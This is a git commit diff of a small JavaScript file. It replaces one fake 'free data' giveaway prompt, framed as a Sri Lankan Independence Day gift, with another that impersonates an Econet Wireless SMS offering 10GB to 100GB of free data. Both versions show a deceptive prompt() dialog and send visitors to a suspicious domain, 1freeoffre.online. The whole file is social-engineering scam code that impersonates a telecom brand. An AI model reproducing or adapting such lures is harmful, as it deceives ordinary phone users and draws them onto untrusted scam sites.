c360672b174910f1c0b8285b87a091d4f7d7ccae
oynxa <heartflet247@gmail.com>
2026-02-01 20:35:01 -0800

    Update activation-independence.js

--- activation-independence.js
+++ activation-independence.js
@@ -1,6 +1,6 @@
 
-var password = '78GB FREE DATA'
-password=prompt('HAPPY INDEPENDENCE DAY CELEBRATION GIFT TO SRI LANKA: Dear Valued Customer Kindly Receive 78GB Free Data As We Celebrate 78th Independence Day, press 78GB Free Data To Get Offer Now! ','78 FREE DATA');
-if (password != '78GB FREE DATA') {
+var password = 'FREE DATA'
+password=prompt('ECONET WIRELESS SMS: Dear Customer, Kindly Check If your Econet Wireless Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
 location.href='https://1freeoffre.online/independence.org.html';
 }
